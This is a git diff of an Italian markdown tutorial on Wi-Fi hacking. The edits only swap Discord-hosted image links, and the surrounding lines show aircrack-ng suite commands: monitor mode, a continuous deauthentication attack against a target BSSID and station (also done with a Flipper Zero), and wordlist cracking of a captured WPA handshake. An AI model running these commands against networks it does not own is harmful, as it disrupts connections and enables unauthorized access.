@@ -21,7 +21,7 @@ Una volta eseguito il comando ci usciranno tutte le schede internet che possedia
 ┕$ sudo airomon-ng start wlan
 ```
 <p align="center">
-  <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236418083815434/2.png?ex=65d7a2e2&is=65c52de2&hm=bc9a2b588cddc145579de3a42ba85e83914b73f1a3f8b34bc8c5afdd0662ee75&">
+  <img src="https://media.discordapp.net/attachments/894962833773711380/1205236418083815434/2.png?ex=662a08a2&is=6628b722&hm=3f5ff56ee293186eecdd33b3b169f04975034e815ed621b121c20dd920456cfe&=&format=webp&quality=lossless">
 </p>
 Successivamente per visualizzare tutte le reti disponibili: <br>
 
@@ -46,7 +46,7 @@ In questo modo stiamo verificando solo la rete in questione.
 Una volta che siamo in listening wifi possiamo procedere con il [Deauth Attack](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack) (Oggi useremo il Flipper Zero ma ci sono altre alternative come ESP32 Marauder ecc...).
 Iniziamo facendo una scansione delle reti, selezioniamo la rete in questione e iniziamo l'attacco.
 <p align="center">
-  <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205237572805201940/IMG_20240208_204300.jpg?ex=65d7a3f5&is=65c52ef5&hm=c392c425e720c22d01c86162d3928e617a214758450acf1ded75b676056fdc25&">
+  <img src="https://media.discordapp.net/attachments/894962833773711380/1205236418327089172/4.png?ex=662a08a2&is=6628b722&hm=ac028cd41dede47486ad5a29ee4992038cc01512a386566eb3c6411157ca3487&=&format=webp&quality=lossless">
 </p>
 Attacco deauth integrato <br>
 
@@ -56,7 +56,7 @@ Attacco deauth integrato <br>
 ┕$ sudo aireplay-ng --deauth 0 -a BSSID -c STATION wlan0mon
 ```
 <p align="center">
-  <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236418616627231/5.png?ex=65d7a2e2&is=65c52de2&hm=f9644f3e6bb8f83eaf5c1015c61aa207a690676337c5b10d5e45bde5d71091d4&">
+  <img src="https://media.discordapp.net/attachments/894962833773711380/1205236418616627231/5.png?ex=662a08a2&is=6628b722&hm=575b361e7a8201ce8926fdf9980cba8740ce7ac23aed1229b91d28e39ece0a48&=&format=webp&quality=lossless&width=1193&height=671">
 </p>
 
 ## $${\color{white}WPA \space \color{green}handshake \space \color{red}decrypt}$$
@@ -69,7 +69,7 @@ Una volta effettuato l'attacco sul terminale linux dovremo trovare un WPA handsh
 ┕$ sudo aircrack-ng NomeFile-01.cap -w Password.txt 
 ```
 <p align="center">
-  <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236418977472573/6.png?ex=65d7a2e2&is=65c52de2&hm=c6b58fe3c05a4b49fa33d9e3d85432edd2f321823269aa00fefa3232dc6756d0&">
+  <img src="https://media.discordapp.net/attachments/894962833773711380/1205236418977472573/6.png?ex=662a08a2&is=6628b722&hm=63eb531c000c29d0ac4f6842fd0a8790eb41bbc3b5bbc75b7cf561ea03a890ce&=&format=webp&quality=lossless">
 </p>
 Il tempo di decriptazione può variare in base alla difficoltà della password.
 
